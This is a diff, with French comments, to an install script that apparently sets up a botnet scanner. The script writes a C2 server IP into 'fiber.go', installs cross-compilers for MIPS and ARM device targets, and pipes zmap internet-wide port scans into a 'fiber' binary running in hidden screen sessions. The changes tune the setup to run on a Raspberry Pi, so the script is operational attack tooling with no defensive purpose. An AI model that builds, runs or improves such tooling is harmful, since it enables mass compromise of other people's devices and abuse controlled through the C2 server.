@@ -68,7 +68,9 @@ install() {
 
     log "Installation des dépendances..."
     apt update -qq
-    apt install -y golang zmap gcc-multilib gcc-mips-linux-gnu gcc-arm-linux-gnueabi screen python3 python3-pip -qq
+    # Tenter d'installer gcc-multilib mais ne pas échouer si absent (cas des serveurs ARM)
+    apt install -y golang zmap gcc-mips-linux-gnu gcc-arm-linux-gnueabi screen python3 python3-pip -qq
+    apt install -y gcc-multilib -qq 2>/dev/null || warn "gcc-multilib non disponible, l'architecture x86_32 ne pourra pas être compilée."
 
     log "Configuration des sources..."
     sed -i "s/c2ServerIP = \".*\"/c2ServerIP = \"$C2_IP\"/g" fiber.go
@@ -99,9 +101,10 @@ if [ \$# -ne 1 ]; then
   exit 1
 fi
 PORT=\$1
-# Limiter le débit de Zmap à 100 Mbps pour éviter de saturer le réseau
-# L'option -B 100M fixe la bande passante maximale à 100 megabits par seconde
-screen -dmS scanner_\$PORT bash -c "zmap -p\$PORT -B 100M -q | ./fiber \$PORT"
+# Limiter drastiquement le débit de Zmap pour éviter de crash le WiFi/Routeur
+# Une Raspberry Pi en WiFi ne supporte pas bien les flux massifs de paquets (NAT table saturation)
+# On utilise -r 1000 (1000 paquets/sec) au lieu de limiter par bande passante
+screen -dmS scanner_\$PORT bash -c "zmap -p\$PORT -r 1000 -q | ./fiber \$PORT"
 EOL
         chmod +x start_scanner.sh
     fi
